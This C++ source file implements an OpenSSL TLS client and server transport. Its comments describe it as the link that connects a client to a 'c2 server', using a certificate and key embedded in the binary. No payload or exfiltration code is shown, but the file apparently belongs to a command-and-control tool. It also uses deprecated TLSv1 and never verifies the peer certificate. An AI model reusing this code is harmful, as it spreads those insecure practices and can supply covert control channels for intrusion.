////////////////////////////////////////////////////////////////////////////////
// ssl.cc
// author: jcramb@gmail.com

#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <ifaddrs.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netdb.h>
#include <cstring>
#include <cstdio>

#include <sys/socket.h>
#include <resolv.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#include "core.h"
#include "cert.h"
#include "ssl.h"

#define SOCKET_BACKLOG 10

////////////////////////////////////////////////////////////////////////////////
// ssl configuration

// TODO: move this stuff into the transport class / abstract args

std::string g_host = SSL_DEFAULT_HOST;
int g_port = SSL_DEFAULT_PORT;

void ssl_set_host(std::string ip) {
    g_host = ip;
}

void ssl_set_port(int port) {
    g_port = port;
}

int ssl_get_port() {
    return g_port;
}

const char * ssl_get_host() {
    return g_host.c_str();
}

////////////////////////////////////////////////////////////////////////////////
// static helper functions

static int ssl_load_certs(SSL_CTX * ctx, char * cert_file, char * key_file);
static void ssl_dump_certs(SSL * ssl);
int ssl_load_cert_buf(SSL_CTX * ctx, char * cert_buf, int cert_len,
                                     char * key_buf, int key_len);

static inline bool is_blocking(int sockfd) {
    return fcntl(sockfd, F_GETFL) & O_NONBLOCK;
}

static inline int set_blocking(int sockfd, bool blocking) {
    int flags = fcntl(sockfd, F_GETFL);
    int nflags = blocking ? flags & ~O_NONBLOCK : flags | O_NONBLOCK;
    return fcntl(sockfd, F_SETFL, nflags);
}

static inline void * get_in_addr(struct sockaddr * sa) {
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);
    } else {
        return &(((struct sockaddr_in6*)sa)->sin6_addr);
    }
}

////////////////////////////////////////////////////////////////////////////////
// get ip address of the specified interface

const char * get_ip(std::string iface) {
    struct ifaddrs *ifaddrs, *index;
    static char addr_str[INET_ADDRSTRLEN];

    // obtain address info
    getifaddrs(&ifaddrs);

    // loop through interfaces
    for (index = ifaddrs; index != NULL; index = index->ifa_next) {

        // only consider IPv4, check if it matches specified interface
        if (index->ifa_addr->sa_family == AF_INET &&
           (iface.empty() || iface == index->ifa_name)) {

            // convert address to presentable format
            void * sai = &((struct sockaddr_in*)index->ifa_addr)->sin_addr;
            inet_ntop(AF_INET, sai, addr_str, INET_ADDRSTRLEN);
        }
    }

    freeifaddrs(ifaddrs);
    return addr_str;
}

////////////////////////////////////////////////////////////////////////////////
// load SSL certificate / key from memory buffers and verify them

int ssl_load_cert_bufs(SSL_CTX * ctx, char * crt_buf, int crt_len,
                                      char * key_buf, int key_len) {


    // load certificate into openssl memory buffer
    BIO * cbio = BIO_new_mem_buf(crt_buf, -1);
    X509 * cert = PEM_read_bio_X509(cbio, NULL, 0, NULL);

    // load key into openssl memory buffer
    BIO * kbio = BIO_new_mem_buf(key_buf, -1);
    RSA * key = PEM_read_bio_RSAPrivateKey(kbio, NULL, 0, NULL);
    
    // perform verification
    if (SSL_CTX_use_certificate(ctx, cert) <= 0) {
        LOG("error: openssl failed to load certificate\n"); 
        return -1;
    }
    if (SSL_CTX_use_RSAPrivateKey(ctx, key) <= 0) {
        LOG("error: openssl failed to load key\n"); 
        return -1;
    }
    if (!SSL_CTX_check_private_key(ctx)) {
        LOG("error: private key does not match public certificate\n");
        return -1;
    }

    return 0;
}

////////////////////////////////////////////////////////////////////////////////
// load SSL certificate / key files and verify them
// NOTE: this function isn't used since certs are loaded from memory buffers

int ssl_load_certs(SSL_CTX * ctx, char * cert_file, char * key_file) {

    // set local cert from certfile
    if (SSL_CTX_use_certificate_file(ctx, cert_file, SSL_FILETYPE_PEM) <= 0) {
        LOG("error: failed to load certificate file\n");
        return -1;
    }

    // set private key from keyfile (may be same as cert)
    if (SSL_CTX_use_PrivateKey_file(ctx, key_file, SSL_FILETYPE_PEM) <= 0) {
        LOG("error: failed to load key file\n");
        return -1; 
    }

    // verify private key
    if (!SSL_CTX_check_private_key(ctx)) {
        LOG("error: private key does not match public certificate\n");
        return -1;
    }

    return 0;
}

////////////////////////////////////////////////////////////////////////////////
// debug function to print SSL certificate information

void ssl_dump_certs(SSL * ssl) {
    X509 * cert;
    char * line;

    // get server certificate
    cert = SSL_get_peer_certificate(ssl);
    if (cert != NULL) {

        // print cert subject
        line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
        LOG("[subject]\n%s\n", line);
        free(line);

        // print cert issuer
        line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
        LOG("[issuer]\n%s\n", line);
        free(line);
        X509_free(cert);

    } else {
        LOG("error: no certs to dump\n");
    }
}

////////////////////////////////////////////////////////////////////////////////
// ssl transport ctors / dtors

ssl_stream::ssl_stream() {
    ctx = NULL;
    ssl = NULL;
    m_sock = -1;
    s_port = d_port = 0;
    s_ip = get_ip();
}

ssl_stream::~ssl_stream() {
    if (m_sock > 0) {
        ::close(m_sock);
    }
    if (ctx != NULL) {
        SSL_CTX_free(ctx);
    }
    if (ssl != NULL) {
        SSL_shutdown(ssl);
        SSL_free(ssl);
    }
}

////////////////////////////////////////////////////////////////////////////////
// blocking function to create SSL transport connection

int ssl_stream::init(int type) {

    // fire up openssl
    SSL_library_init();
    SSL_METHOD * method;
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();

    // determine SSL method based on transport type
    if (type == TPT_CLIENT) {
        method = (SSL_METHOD*)TLSv1_client_method();
    } else if (type == TPT_SERVER) {
        method = (SSL_METHOD*)TLSv1_server_method();
    } else {
        LOG("error: invalid transport type\n");
        return -1;
    }

    // create SSL context
    ctx = SSL_CTX_new(method);
    if (ctx == NULL) {
        LOG("error: ssl failed to created new CTX\n");
        return -1;
    }

    // load SSL certificates from memory and verifies them 
    // NOTE: these buffers are generated by bin2cc.py 
    if (ssl_load_cert_bufs(ctx, _crtbuf, _crtbuf_len,
                                _keybuf, _keybuf_len) < 0) {
        LOG("error: ssl failed to verify certificates\n");
        return -1;
    }
    LOG("info: SSL certificates verified\n");

    // initialise connection based on whether we are the client or server
    if (type == TPT_CLIENT) {

        // if client, connect to c2 server
        return this->connect(g_host, g_port);

    } else if (type == TPT_SERVER) {

        // if server, bind to desired port and accept client connection
        if (this->bind(g_port) == 0) {
            return this->accept();
        } 

    } else {
        LOG("error: invalid transport type\n");
    }

    return -1;
}

////////////////////////////////////////////////////////////////////////////////
// SSL implementation to send transport msg's 

int ssl_stream::send(message & msg) {

    // TODO: handle SSL_ERROR_WANT_READ
    //       handle SSL_ERROR_WANT_WRITE using SSL_get_error()
    // http://funcptr.net/2012/04/08/openssl-as-a-filter-%28or-non-blocking-openssl%29/

    int len = msg.data_len();
    int bytes_sent = 0;

    // send all data 
    while (bytes_sent < len) {
        int bytes = SSL_write(ssl, msg.data() + bytes_sent, len - bytes_sent);
        if (bytes == -1) {
            LOG("error: SSL transport failed to send message!\n");
            return -1;
        } else {
            bytes_sent += bytes;
        }
    }
    return bytes_sent;
}

////////////////////////////////////////////////////////////////////////////////
// SSL implementation to receive transport msg's

int ssl_stream::recv(message & msg) {

    // receive the message header first to determine size
    int bytes = SSL_read(ssl, msg.data(), msg.header_len); 
    if (bytes == 0) {
        return TPT_CLOSE;
    } else if (bytes < 0) {
        return TPT_EMPTY; // TODO: potential unreported errors here
    } 

    // enforce size constraint, in case of malicious msg sizes
    msg.resize(msg.body_len());
    bytes = SSL_read(ssl, msg.body(), msg.body_len());
    return bytes;
}

////////////////////////////////////////////////////////////////////////////////
// transport client implementation to connect with c2 server over SSL

int ssl_stream::connect(std::string host, int port) {
    struct addrinfo hints, *server, *index;
    char addr_str[INET6_ADDRSTRLEN];
    int ai_result;
    int err;

    // configure hints for tcp connection
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    // obtain address info for server
    char _port[32];
    snprintf(_port, sizeof(_port), "%d", port);
    if ((ai_result = getaddrinfo(host.c_str(), _port, &hints, &server)) != 0) {
        LOG("error: %s\n", gai_strerror(ai_result));
        return ai_result;
    }

    // loop through results, connect to first possible
    for (index = server; index != NULL; index = index->ai_next) {

        // try to open a tcp socket for this result
        if ((m_sock = socket(index->ai_family,
                             index->ai_socktype,
                             index->ai_protocol)) == -1) {
            LOG("error: (socket) %s\n", strerror(errno));
            continue;
        } 

        // connect to server using new socket
        if ((err = ::connect(m_sock,
                             index->ai_addr,
                             index->ai_addrlen)) == -1) {
            LOG("error: (connect) %s\n", strerror(errno));
            this->close();
            continue;
        }

        // obtain presentable address of server
        inet_ntop(index->ai_family,
                  get_in_addr((struct sockaddr*)index->ai_addr),
                  addr_str,
                  sizeof(addr_str));

        // success!
        d_ip = host;
        d_port = port;
        break;
    }

    // clean up address info
    freeaddrinfo(server);

    // create ssl session
    ssl = SSL_new(ctx);
    if (ssl == NULL) {
        LOG("error: ssl failed to create session\n");
        return -1;
    }

    // pass socket to openssl
    SSL_set_fd(ssl, m_sock);
    if (SSL_connect(ssl) == -1) {
        LOG("error: ssl failed to connect\n");
        return -1;
    }

    // log ssl connection info / make socket non-blocking
    LOG("info: SSL connection established (%s)\n", SSL_get_cipher(ssl)); 
    ssl_dump_certs(ssl);
    set_blocking(m_sock, false);

    return m_sock;
}

////////////////////////////////////////////////////////////////////////////////
// transport server implementation to bind/listen on c2 server port

int ssl_stream::bind(int port) {
    struct addrinfo hints, *ai, *index;
    int ai_result;
    
    // configure hints for tcp connection
    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family = AF_INET;
    hints.ai_flags = AI_PASSIVE;

    // obtain address info for server port
    char _port[32] = {0};
    snprintf(_port, sizeof(_port), "%d", port);
    if ((ai_result = getaddrinfo(NULL, _port, &hints, &ai)) != 0) {
        LOG("error:: %s\n", gai_strerror(ai_result));
        return ai_result;
    }

    // loop through results and bind to first possible
    for (index = ai; index != NULL; index = index->ai_next) {

        // attempt to open socket
        if ((m_sock = socket(index->ai_family,
                             index->ai_socktype,
                             index->ai_protocol)) == -1) {
            LOG("error: (socket) %s\n", strerror(errno));
            continue;
        } 

        // avoid "address already in use" errors
        int optval = 1;
        setsockopt(m_sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(int));

        // bind socket to server port
        if (::bind(m_sock, index->ai_addr, index->ai_addrlen) == -1) {
            LOG("error: (bind) %s\n", strerror(errno));
            continue;
        } 

        // start listening for connections
        if (::listen(m_sock, SOCKET_BACKLOG) == -1) {
            LOG("error: (listen) %s\n", strerror(errno));
            this->close();
            continue;
        } 

        // success!
        s_port = port;
        break;
    }
    
    freeaddrinfo(ai);
    return index == NULL ? -1 : m_sock;
}

////////////////////////////////////////////////////////////////////////////////
// transport server implementation to accept client SSL connection 

int ssl_stream::accept() {
    struct sockaddr_storage client;
    socklen_t len = sizeof(client);
    char client_ip[INET6_ADDRSTRLEN];

    // wait for client to connect
    // NOTE: here we clobber the server's listening socket stored in m_sock
    m_sock = ::accept(m_sock, (struct sockaddr*)&client, &len);
    if (m_sock <= 0) {
      LOG("error: (accept) %s\n", strerror(errno));
      return -1;
    }

    // request connected client information
    inet_ntop(client.ss_family,
              get_in_addr((struct sockaddr*)&client),
              client_ip, 
              INET6_ADDRSTRLEN);

    // pass client socket to openssl and accept the connection 
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, m_sock);
    if (SSL_accept(ssl) == -1) {
        LOG("error: ssl accept failed\n");
        return -1;
    }

    d_ip = client_ip;
    d_port = ntohs(((struct sockaddr_in*)&client)->sin_port); 
    LOG("info: connection established %s:%d\n", d_ip.c_str(), d_port); 

    // log ssl connection info / make socket non-blocking
    LOG("info: SSL connected using cipher (%s)\n", SSL_get_cipher(ssl)); 
    ssl_dump_certs(ssl);
    set_blocking(m_sock, false);
    
    return m_sock;
}

////////////////////////////////////////////////////////////////////////////////
// tear down SSL connection

void ssl_stream::close() {
    if (m_sock > 0) {
        ::close(m_sock);
    }
    if (ctx != NULL) {
        SSL_CTX_free(ctx);
        ctx = NULL;
    } 
    if (ssl != NULL) {
        SSL_shutdown(ssl);
        SSL_free(ssl);
        ssl = NULL;
    }
    m_sock = -1;
    d_ip = "";
    s_port = d_port = 0;
}

////////////////////////////////////////////////////////////////////////////////
